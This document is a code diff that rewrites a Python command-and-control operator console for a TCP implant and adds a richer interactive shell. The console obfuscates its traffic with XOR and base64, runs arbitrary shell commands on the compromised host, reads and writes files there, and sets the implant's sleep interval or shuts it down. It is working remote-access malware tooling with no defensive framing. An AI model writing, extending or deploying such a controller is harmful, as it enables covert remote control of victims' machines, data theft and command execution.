@@ -1,149 +1,210 @@
+#!/usr/bin/env python3
+
 import socket
 import json
 import base64
 import sys
+import argparse
+
+try:
+    from rich.console import Console
+    from rich.syntax import Syntax
+    from rich.panel import Panel
+    _RICH = True
+    console = Console()
+except ImportError:
+    _RICH = False
+
+try:
+    from prompt_toolkit import PromptSession
+    from prompt_toolkit.history import InMemoryHistory
+    from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+    from prompt_toolkit.completion import WordCompleter
+    _PT = True
+except ImportError:
+    _PT = False
+
 
 XOR_KEY = b'keyed_up'
 
+def _xor(data):
+    k = len(XOR_KEY)
+    return bytes([b ^ XOR_KEY[i % k] for i, b in enumerate(data)])
 
-def xor_obfuscate(data):
-    key_len = len(XOR_KEY)
-    return bytes([b ^ XOR_KEY[i % key_len] for i, b in enumerate(data)])
+def encode(msg):
+    return base64.b64encode(_xor(json.dumps(msg).encode()))
 
-def xor_deobfuscate(data):
-    return xor_obfuscate(data)
-
-def base64_obfuscate(data):
-    return base64.b64encode(data)
-
-def base64_deobfuscate(data):
-    return base64.b64decode(data)
+def decode(data):
+    return json.loads(_xor(base64.b64decode(data)).decode())
 
 
-def usage():
-    print(f"Usage: {sys.argv[0]} <host> [port]")
-    print("Example:")
-    print(f"  {sys.argv[0]} 192.168.20.19")
-    print(f"  {sys.argv[0]} 192.168.20.19 4444")
-    sys.exit(1)
+class ImplantConn:
+    def __init__(self, host, port):
+        self.host  = host
+        self.port  = port
+        self._sock = None
+        self._req  = 1
+
+    def connect(self):
+        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._sock.connect((self.host, self.port))
+
+    def close(self):
+        if self._sock:
+            self._sock.close()
+            self._sock = None
+
+    def send(self, cmd_type, payload):
+        msg  = {"type": cmd_type, "request_id": self._req, "payload": payload}
+        data = encode(msg)
+        self._sock.sendall(len(data).to_bytes(4, "big") + data)
+        self._req += 1
+        return self._recv()
+
+    def _recv(self):
+        raw = self._recv_n(4)
+        n   = int.from_bytes(raw, "big")
+        return decode(self._recv_n(n))
+
+    def _recv_n(self, n):
+        buf = b""
+        while len(buf) < n:
+            chunk = self._sock.recv(n - len(buf))
+            if not chunk:
+                raise ConnectionError("Implant closed the connection")
+            buf += chunk
+        return buf
 
 
-def send_command(sock, cmd_type, req_id, payload):
-    message = {
-        "type": cmd_type,
-        "request_id": req_id,
-        "payload": payload
-    }
+def print_response(resp):
+    text = json.dumps(resp, indent=2)
+    if _RICH:
+        rtype  = resp.get("type", "")
+        border = "red" if rtype == "error" else "green"
+        title  = f"[bold]{rtype}[/bold]  req={resp.get('request_id','?')}"
+        console.print(Panel(
+            Syntax(text, "json", theme="monokai", word_wrap=True),
+            title=title, border_style=border,
+        ))
+    else:
+        print("Response:", text)
 
-    plaintext = json.dumps(message).encode('utf-8')
-    obfuscated = base64_obfuscate(xor_obfuscate(plaintext))
+def err(msg):
+    if _RICH: console.print(f"[!] {msg}", style="bold red")
+    else: print(f"[!] {msg}")
 
-    sock.sendall(len(obfuscated).to_bytes(4, "big") + obfuscated)
+def info(msg):
+    if _RICH: console.print(f"[*] {msg}", style="bold cyan")
+    else: print(f"[*] {msg}")
 
-    len_data = sock.recv(4)
-    if not len_data:
-        raise ConnectionError("Connection closed by implant")
 
-    resp_len = int.from_bytes(len_data, "big")
+COMMANDS = ["HELLO","SHUTDOWN","SET_SLEEP","READ_DATA","WRITE_DATA","RUN_CMD",
+            "help","exit","quit"]
 
-    resp_data = b''
-    while len(resp_data) < resp_len:
-        chunk = sock.recv(resp_len - len(resp_data))
-        if not chunk:
+HELP_TEXT = """
+  HELLO                          Ping the implant
+  SET_SLEEP <seconds>            Set implant sleep interval
+  RUN_CMD   <command>            Execute a shell command
+  READ_DATA  [filename]          Read a file from the implant
+  WRITE_DATA <filename> <data>   Write data to a file on the implant
+  SHUTDOWN                       Shut the implant down
+  exit / quit                    Disconnect and exit
+"""
+
+BANNER = r"""
+  ██████╗██████╗      ██████╗██╗     ██╗
+ ██╔════╝╚════██╗    ██╔════╝██║     ██║
+ ██║      █████╔╝    ██║     ██║     ██║
+ ██║     ██╔═══╝     ██║     ██║     ██║
+ ╚██████╗███████╗    ╚██████╗███████╗██║
+  ╚═════╝╚══════╝     ╚═════╝╚══════╝╚═╝
+   Operator CLI  |  XOR/b64 TCP implant
+"""
+
+
+def run_repl(conn):
+    if _RICH: console.print(BANNER, style="bold cyan")
+    else: print(BANNER)
+
+    info(f"Connected to implant at {conn.host}:{conn.port}")
+    info("Type 'help' for commands\n")
+
+    if _PT:
+        session = PromptSession(
+            history=InMemoryHistory(),
+            auto_suggest=AutoSuggestFromHistory(),
+            completer=WordCompleter(COMMANDS, ignore_case=True),
+        )
+        _input = lambda: session.prompt("> ")
+    else:
+        _input = lambda: input("> ")
+
+    while True:
+        try:
+            line = _input().strip()
+        except (KeyboardInterrupt, EOFError):
+            print(); break
+
+        if not line:
+            continue
+
+        parts = line.split()
+        cmd   = parts[0].upper()
+        args  = parts[1:]
+
+        if cmd in ("EXIT", "QUIT"):
             break
-        resp_data += chunk
+        if cmd == "HELP":
+            print(HELP_TEXT); continue
 
-    try:
-        decoded = base64_deobfuscate(resp_data)
-        plaintext = xor_deobfuscate(decoded)
-        response = json.loads(plaintext.decode('utf-8'))
-        return response
-    except Exception as e:
-        return {
-            "type": "error",
-            "request_id": req_id,
-            "payload": {"code": "PROCESSING_ERROR", "message": str(e)}
-        }
+        if cmd == "HELLO":
+            payload = {}
+        elif cmd == "SHUTDOWN":
+            payload = {}
+        elif cmd == "SET_SLEEP":
+            if not args: err("Usage: SET_SLEEP <seconds>"); continue
+            try: payload = {"seconds": int(args[0])}
+            except ValueError: err("Seconds must be an integer"); continue
+        elif cmd == "READ_DATA":
+            payload = {"filename": args[0]} if args else {}
+        elif cmd == "WRITE_DATA":
+            if len(args) < 2: err("Usage: WRITE_DATA <filename> <data>"); continue
+            payload = {"filename": args[0], "data": " ".join(args[1:])}
+        elif cmd == "RUN_CMD":
+            if not args: err("Usage: RUN_CMD <command>"); continue
+            payload = {"command": " ".join(args)}
+        else:
+            err(f"Unknown command: '{cmd}'. Type 'help'."); continue
+
+        try:
+            resp = conn.send(cmd, payload)
+            print_response(resp)
+        except ConnectionError as exc:
+            err(f"Lost connection: {exc}"); break
+        except Exception as exc:
+            err(f"Error: {exc}"); continue
+
+        if cmd == "SHUTDOWN":
+            break
+
+    conn.close()
+    info("Disconnected.")
 
 
 def main():
-    if len(sys.argv) < 2:
-        usage()
+    parser = argparse.ArgumentParser(description="Operator CLI")
+    parser.add_argument("host")
+    parser.add_argument("port", nargs="?", type=int, default=4444)
+    a = parser.parse_args()
 
-    HOST = sys.argv[1]
-    PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
-
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((HOST, PORT))
-    print(f"Controller connected to implant at {HOST}:{PORT}")
-
-    req_id = 1
-
+    conn = ImplantConn(a.host, a.port)
     try:
-        while True:
-            cmd_line = input("> ").strip()
-            if not cmd_line:
-                continue
+        conn.connect()
+    except Exception as exc:
+        err(f"Cannot connect to {a.host}:{a.port} — {exc}")
+        sys.exit(1)
 
-            parts = cmd_line.split()
-            cmd = parts[0].upper()
-            args = parts[1:]
-
-            if cmd == "HELLO":
-                payload = {}
-
-            elif cmd == "SHUTDOWN":
-                payload = {}
-
-            elif cmd == "SET_SLEEP":
-                if not args:
-                    print("Usage: SET_SLEEP <seconds>")
-                    continue
-                try:
-                    seconds = int(args[0])
-                except ValueError:
-                    print("Seconds must be integer")
-                    continue
-                payload = {"seconds": seconds}
-
-            elif cmd == "READ_DATA":
-                filename = args[0] if args else None
-                payload = {"filename": filename} if filename else {}
-
-            elif cmd == "WRITE_DATA":
-                if len(args) < 2:
-                    print("Usage: WRITE_DATA <filename> <data>")
-                    continue
-                filename = args[0]
-                data = ' '.join(args[1:])
-                payload = {"filename": filename, "data": data}
-
-            elif cmd == "RUN_CMD":
-                if not args:
-                    print("Usage: RUN_CMD <command>")
-                    continue
-                command = ' '.join(args)
-                payload = {"command": command}
-
-            else:
-                print(f"Unknown command: {cmd}")
-                print("Usage: HELLO, SHUTDOWN, SET_SLEEP, READ_DATA, WRITE_DATA, RUN_CMD")
-                continue
-
-            resp = send_command(sock, cmd, req_id, payload)
-            print("Response:", json.dumps(resp, indent=2))
-
-            if cmd == "SHUTDOWN":
-                break
-
-            req_id += 1
-
-    except KeyboardInterrupt:
-        print("\nController Interrupted")
-
-    finally:
-        sock.close()
-        print("Controller disconnected")
+    run_repl(conn)
 
 
 if __name__ == "__main__":
